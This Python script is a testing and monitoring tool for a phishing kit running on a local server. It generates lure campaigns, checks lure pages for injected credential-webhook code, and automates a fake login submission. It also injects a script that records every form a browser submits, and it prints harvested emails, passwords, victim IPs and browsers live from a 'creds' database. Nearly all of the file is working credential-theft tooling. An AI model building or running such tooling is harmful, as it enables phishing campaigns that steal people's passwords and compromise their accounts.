#!/usr/bin/env python3
"""
Advanced Browser Automation with Playwright
Automated page capture, form submission, and credential verification
"""

import asyncio
import json
import sqlite3
from datetime import datetime

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

import requests

BASE = "http://127.0.0.1:5000"

def get_latest_cred():
    """Get most recently captured credential"""
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, email, username, password, rip, browser, pdate 
            FROM creds ORDER BY id DESC LIMIT 1
        """)
        row = cursor.fetchone()
        conn.close()
        return row
    except:
        return None

async def test_with_playwright(lure_url):
    """Test using Playwright for real browser automation"""
    if not PLAYWRIGHT_AVAILABLE:
        print("[!] Playwright not installed")
        print("    Install with: pip install playwright")
        print("    Then setup with: playwright install")
        return False
    
    print("\n[*] Starting Playwright browser automation...")
    
    try:
        async with async_playwright() as p:
            # Launch browser
            browser = await p.chromium.launch(headless=False)
            page = await browser.new_page()
            
            print(f"[+] Browser launched")
            print(f"[*] Navigating to: {lure_url}")
            
            # Go to lure page
            await page.goto(lure_url)
            print(f"[+] Page loaded")
            
            # Wait for form
            await page.wait_for_selector('input[name="email"]', timeout=5000)
            print(f"[+] Form detected on page")
            
            # Get page title
            title = await page.title()
            print(f"[*] Page title: {title}")
            
            # Get page content length
            content = await page.content()
            print(f"[*] Page size: {len(content)} bytes")
            
            # Check for injection code
            script_content = await page.evaluate('() => document.documentElement.innerHTML')
            if 'api/credential-webhook' in script_content or 'hook.js' in content:
                print(f"[+] Injection code detected in page!")
            
            # Fill form
            print(f"\n[*] Automating form submission...")
            await page.fill('input[name="email"]', 'playwright@example.com')
            print(f"[+] Email filled: playwright@example.com")
            
            await page.fill('input[name="password"]', 'playwright_pass_456')
            print(f"[+] Password filled: playwright_pass_456")
            
            # Submit
            await page.click('button[type="submit"], input[type="submit"], .btn-outline-primary')
            print(f"[+] Form submitted")
            
            # Wait for response
            await page.wait_for_load_state('networkidle', timeout=3000)
            await asyncio.sleep(2)
            
            # Take screenshot
            await page.screenshot(path='lure_page.png')
            print(f"[+] Screenshot saved: lure_page.png")
            
            # Close browser
            await browser.close()
            print(f"[+] Browser closed")
            
            # Check for capture
            latest = get_latest_cred()
            if latest and latest[1] == 'playwright@example.com':
                print(f"\n[+] SUCCESS! Credential captured from browser!")
                cred_id, email, username, password, rip, browser, pdate = latest
                print(f"    ID: {cred_id}")
                print(f"    Email: {email}")
                print(f"    Password verified in DB: {password == 'playwright_pass_456'}")
                return True
            else:
                print(f"[!] Credential not found in database")
                return False
                
    except Exception as e:
        print(f"[!] Playwright error: {e}")
        import traceback
        traceback.print_exc()
        return False

async def continuous_monitor():
    """Monitor and automatically capture credentials from browser"""
    print("\n[*] Starting continuous credential monitor...")
    print("[*] Watching for form submissions...")
    
    if not PLAYWRIGHT_AVAILABLE:
        print("[!] Playwright required for browser monitoring")
        return
    
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=False)
            context = await browser.new_context()
            
            # Inject script to monitor form submissions
            await context.add_init_script("""
                window.capturedCredentials = [];
                document.addEventListener('submit', (e) => {
                    const formData = new FormData(e.target);
                    const data = Object.fromEntries(formData);
                    window.capturedCredentials.push({
                        timestamp: new Date(),
                        data: data,
                        url: window.location.href
                    });
                    console.log('FORM SUBMITTED:', data);
                });
            """)
            
            page = await context.new_page()
            
            print("[*] Open your browser and navigate to phishing pages...")
            print("[*] Press CTRL+C to stop monitoring")
            
            # Keep browser open
            while True:
                await asyncio.sleep(1)
                
                try:
                    creds = await page.evaluate('() => window.capturedCredentials')
                    if creds:
                        print(f"\n[+] Captured form submissions: {len(creds)}")
                        for cred in creds:
                            print(f"    {cred}")
                except:
                    pass
            
            await browser.close()
            
    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped")
    except Exception as e:
        print(f"[!] Error: {e}")

def monitor_database():
    """Real-time database monitoring"""
    print("\n[*] Starting real-time database monitor...")
    print("[*] Watching for new credentials...")
    
    try:
        last_id = 0
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT MAX(id) FROM creds")
        result = cursor.fetchone()
        if result and result[0]:
            last_id = result[0]
        conn.close()
        
        print(f"[*] Starting from credential ID: {last_id}")
        print("[*] Press CTRL+C to stop monitoring\n")
        
        while True:
            conn = sqlite3.connect('database.db')
            cursor = conn.cursor()
            cursor.execute("""
                SELECT id, email, username, password, rip, browser, pdate
                FROM creds WHERE id > ? ORDER BY id ASC
            """, (last_id,))
            rows = cursor.fetchall()
            conn.close()
            
            for row in rows:
                cred_id, email, username, password, rip, browser, pdate = row
                print(f"\n[+] NEW CREDENTIAL CAPTURED!")
                print(f"    ID: {cred_id}")
                print(f"    Email: {email}")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                print(f"    From IP: {rip}")
                print(f"    Browser: {browser}")
                print(f"    Time: {pdate}")
                last_id = cred_id
            
            import time
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped")
    except Exception as e:
        print(f"[!] Error: {e}")

async def main():
    print("\n" + "="*80)
    print("ADVANCED BROWSER AUTOMATION SYSTEM")
    print("="*80)
    
    # Check server
    print("\n[*] Checking server...")
    try:
        requests.get(f"{BASE}/", timeout=3)
        print("[+] Server is running")
    except:
        print("[!] Server not running")
        return
    
    # Generate lure
    print("\n[*] Generating test lure campaign...")
    try:
        data = {
            "template_id": 1,
            "target_url": "https://example.com",
            "campaign_name": f"Playwright_Test_{datetime.now().strftime('%H%M%S')}"
        }
        resp = requests.post(f"{BASE}/api/generate-lure", json=data, timeout=5)
        
        try:
            result = resp.json()
            lure_url = result.get('lure_url')
        except:
            conn = sqlite3.connect('database.db')
            cursor = conn.cursor()
            cursor.execute("SELECT full_url FROM lure_urls ORDER BY id DESC LIMIT 1")
            row = cursor.fetchone()
            conn.close()
            lure_url = row[0] if row else None
        
        if not lure_url:
            lure_url = f"{BASE}/capture/test_lure"
        
        print(f"[+] Lure URL: {lure_url}")
    except Exception as e:
        print(f"[!] Error: {e}")
        lure_url = None
    
    # Menu
    print("\n" + "="*80)
    print("OPTIONS:")
    print("="*80)
    print("1. Run automated browser test (Playwright)")
    print("2. Start real-time database monitor")
    print("3. Start browser monitoring (watch for form submissions)")
    print("4. Exit")
    
    choice = input("\nSelect option (1-4): ").strip()
    
    if choice == "1":
        if lure_url:
            result = await test_with_playwright(lure_url)
            if result:
                print("\n[+] AUTOMATION TEST PASSED!")
            else:
                print("\n[!] Test failed")
        else:
            print("[!] No lure URL available")
    elif choice == "2":
        monitor_database()
    elif choice == "3":
        await continuous_monitor()
    elif choice == "4":
        print("[*] Exiting")
    else:
        print("[!] Invalid option")

if __name__ == "__main__":
    try:
        if PLAYWRIGHT_AVAILABLE:
            asyncio.run(main())
        else:
            print("[!] Playwright not installed")
            print("    Install with: pip install playwright")
            print("    Then setup with: playwright install")
            
            import sys
            sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
